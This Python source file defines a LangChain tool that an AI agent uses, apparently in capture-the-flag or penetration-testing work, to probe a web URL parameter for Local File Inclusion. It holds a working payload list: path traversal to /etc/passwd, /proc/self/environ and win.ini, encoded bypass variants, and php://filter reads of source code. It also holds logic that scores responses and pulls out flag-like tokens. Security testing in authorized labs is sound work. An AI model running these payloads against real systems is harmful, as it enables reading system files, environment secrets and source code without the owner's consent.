"""
LFI-focused verification tools for v0.7.

The tool keeps payload attempts bounded, compares responses against a
baseline, and returns concise evidence so the agent can stop probing instead
of burning LangGraph recursion steps.
"""

from __future__ import annotations

import difflib
import re
from dataclasses import dataclass
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import urllib3
from langchain_core.tools import tool

from .http_client import get, normalize_url, truncate_text
from .results import Evidence, Finding, RequestRecord, ToolResult, error_result, response_record

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


MAX_PAYLOADS = 24
STOP_AFTER_ERRORS = 5
FLAG_RE = re.compile(
    r"(?i)\b(?:flag|ctf|bugku|key|token)\s*[\{:=]\s*([A-Za-z0-9_\-+/=]{6,120})\}?"
)


@dataclass
class ProbeResult:
    payload: str
    url: str
    status: int | str
    length: int
    score: int
    evidence: list[str]
    preview: str


def _set_query_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    replaced = False
    updated: list[tuple[str, str]] = []
    for key, old_value in pairs:
        if key == param:
            updated.append((key, value))
            replaced = True
        else:
            updated.append((key, old_value))
    if not replaced:
        updated.append((param, value))
    return urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))


def _available_params(url: str) -> list[str]:
    parsed = urlparse(url)
    return [key for key, _value in parse_qsl(parsed.query, keep_blank_values=True)]


def _payloads(original_value: str) -> list[str]:
    candidates = [
        "/etc/passwd",
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/proc/self/environ",
        "../../../../../../proc/self/environ",
        "C:/Windows/win.ini",
        "../windows/win.ini",
        "..\\..\\..\\windows\\win.ini",
        "../../../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=./index.php",
        "file:///etc/passwd",
    ]
    if original_value:
        candidates.extend(
            [
                f"../{original_value}",
                f"../../{original_value}",
                f"../../../{original_value}",
            ]
        )
    seen: set[str] = set()
    result: list[str] = []
    for item in candidates:
        if item not in seen:
            seen.add(item)
            result.append(item)
        if len(result) >= MAX_PAYLOADS:
            break
    return result


def _score_response(text: str, baseline_text: str, invalid_text: str) -> tuple[int, list[str]]:
    evidence: list[str] = []
    score = 0
    lower = text.lower()

    indicators = [
        ("unix passwd", "root:x:0:0"),
        ("unix shell list", "/bin/bash"),
        ("proc environ", "http_user_agent="),
        ("windows win.ini", "[fonts]"),
        ("windows extensions", "[extensions]"),
        ("php filter base64", "pd9waha"),
    ]
    for label, needle in indicators:
        if needle in lower:
            score += 50
            evidence.append(label)

    flag_match = FLAG_RE.search(text)
    if flag_match:
        score += 80
        evidence.append(f"flag-like value: {flag_match.group(0)[:120]}")

    if text and text != baseline_text:
        ratio = difflib.SequenceMatcher(None, baseline_text[:6000], text[:6000]).ratio()
        if ratio < 0.85:
            score += 15
            evidence.append(f"baseline diff ratio {ratio:.2f}")

    if invalid_text and text != invalid_text:
        invalid_ratio = difflib.SequenceMatcher(None, invalid_text[:6000], text[:6000]).ratio()
        if invalid_ratio < 0.85:
            score += 10
            evidence.append(f"invalid-value diff ratio {invalid_ratio:.2f}")

    noisy_errors = [
        "failed to open stream",
        "no such file",
        "permission denied",
        "include_path",
        "illegal path",
        "not allowed",
        "open_basedir",
    ]
    for marker in noisy_errors:
        if marker in lower:
            evidence.append(marker)
            if marker in ("failed to open stream", "include_path", "open_basedir"):
                score += 8

    return score, evidence


@tool
def test_lfi_param(url: str, param: str, max_payloads: int = 16) -> str:
    """
    Verify a suspected Local File Inclusion parameter with bounded payloads.

    Parameters:
        url: Target URL containing the query parameter, for example
             http://example.com/index.php?language=en
        param: Query parameter to replace, for example language
        max_payloads: Maximum payload attempts, capped at 24.
    """
    target_url = normalize_url(url)
    params = _available_params(target_url)
    if param not in params:
        return error_result(
            "test_lfi_param", target_url,
            f"Parameter '{param}' is not present in the query string. Available parameters: {', '.join(params) if params else '(none)'}",
        ).to_text()

    parsed = urlparse(target_url)
    original_pairs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    original_value = original_pairs.get(param, "")
    invalid_value = "codex_lfi_probe_missing_file"

    try:
        baseline = get(target_url, timeout=8)
        invalid_url = _set_query_param(target_url, param, invalid_value)
        invalid = get(invalid_url, timeout=8)
    except Exception as exc:
        return error_result("test_lfi_param", target_url, f"Baseline request failed: {exc}").to_text()

    attempts = max(1, min(int(max_payloads or 16), MAX_PAYLOADS))
    payloads = _payloads(original_value)[:attempts]
    results: list[ProbeResult] = []
    errors = 0

    for payload in payloads:
        probe_url = _set_query_param(target_url, param, payload)
        try:
            response = get(probe_url, timeout=8)
            score, evidence = _score_response(response.text, baseline.text, invalid.text)
            if score > 0 or evidence:
                results.append(
                    ProbeResult(
                        payload=payload,
                        url=probe_url,
                        status=response.status_code,
                        length=len(response.text),
                        score=score,
                        evidence=evidence,
                        preview=truncate_text(response.text.strip(), 500),
                    )
                )
            if score >= 60:
                break
        except Exception as exc:
            errors += 1
            results.append(
                ProbeResult(
                    payload=payload,
                    url=probe_url,
                    status="error",
                    length=0,
                    score=0,
                    evidence=[str(exc)],
                    preview="",
                )
            )
            if errors >= STOP_AFTER_ERRORS:
                break

    ranked = sorted(results, key=lambda item: item.score, reverse=True)
    best = ranked[0] if ranked else None
    confidence = "unconfirmed"
    if best:
        if best.score >= 80:
            confidence = "confirmed"
        elif best.score >= 35:
            confidence = "likely"
        elif best.score > 0:
            confidence = "weak"

    lines = [
        f"[test_lfi_param] {target_url}",
        f"Parameter: {param}",
        f"Original value: {original_value or '(empty)'}",
        f"Baseline: status={baseline.status_code}, length={len(baseline.text)}",
        f"Invalid value: status={invalid.status_code}, length={len(invalid.text)}",
        f"Payload attempts: {min(len(payloads), attempts)}",
        f"Confidence: {confidence}",
        "",
    ]

    if not ranked:
        lines.extend(
            [
                "No LFI evidence found with the bounded payload set.",
                "Observed constraint: payload responses matched baseline/invalid responses or produced no useful markers.",
            ]
        )
        readable = "\n".join(lines)
        return ToolResult(
            tool="test_lfi_param", target=target_url, status="ok", summary="未发现 LFI 证据",
            raw_excerpt=readable, request=RequestRecord("GET", target_url, parameters={param: original_value}),
            response=response_record(baseline),
            data={"baseline": response_record(baseline).__dict__, "invalid": response_record(invalid).__dict__, "attempts": []},
        ).to_text()

    lines.append("Top evidence:")
    for item in ranked[:5]:
        lines.append(f"- score={item.score} status={item.status} length={item.length}")
        lines.append(f"  payload: {item.payload}")
        lines.append(f"  url: {item.url}")
        lines.append(f"  evidence: {', '.join(item.evidence) if item.evidence else '(diff only)'}")
        if item.score >= 35 and item.preview:
            lines.append("  preview:")
            lines.append("  " + item.preview.replace("\n", "\n  "))

    if best and best.score < 35:
        lines.append("")
        lines.append("Result: weak signal only. Treat as constrained/path-filtered unless additional evidence is found.")
    elif best:
        lines.append("")
        lines.append("Result: likely LFI. Use the payload, URL, and preview above as reproduction evidence.")

    readable = "\n".join(lines)
    evidence_data = {
        "baseline": response_record(baseline).__dict__,
        "invalid": response_record(invalid).__dict__,
        "attempts": [item.__dict__ for item in ranked[:5]],
    }
    finding = Finding(
        title="本地文件包含（LFI）验证结果",
        severity="high", confidence=confidence, category="lfi",
        evidence=[Evidence(
            "response_diff", "; ".join(best.evidence) or "Response differs from controls.", best.url,
            {"payload": best.payload, "status": best.status, "length": best.length, "preview": best.preview},
        )],
        reproduction=[f"GET {best.url}", "与 baseline 和无效值请求比较状态码、长度及关键响应片段。"],
    )
    return ToolResult(
        tool="test_lfi_param", target=target_url, status="ok", summary=f"LFI 验证结论：{confidence}",
        raw_excerpt=readable, findings=[finding],
        request=RequestRecord("GET", target_url, parameters={param: original_value}, payload=best.payload),
        response=response_record(baseline), data=evidence_data,
    ).to_text()
